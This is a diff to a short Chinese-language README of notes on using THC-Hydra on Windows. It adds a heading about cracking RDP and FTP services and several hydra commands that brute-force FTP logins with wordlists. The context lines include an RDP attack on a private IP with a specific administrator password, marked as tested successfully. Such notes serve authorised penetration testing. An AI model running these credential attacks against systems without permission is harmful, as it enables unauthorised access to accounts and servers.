@@ -1,3 +1,5 @@
+破解rdp，ftp等服务 
+
 亲测试成功
 =================
 可参照：https://www.cnblogs.com/HC2018/articles/10125347.html
@@ -9,6 +11,12 @@ hydra -l administrator -p Wutos2017 10.11.2.34 rdp
 
 * 也可以通过查询文件执行
 hydra -L admin.txt -P pass.txt 10.11.2.34 rdp
+
+* 也可以执行
+hydra -l admin -p password ftp://localhost/
+hydra -L default_logins.txt -p test ftp://localhost/
+hydra -l admin -P common_passwords.txt ftp://localhost/
+hydra -L logins.txt -P passwords.txt ftp://localhost/
 
 THC-HYDRA-windows
 =================
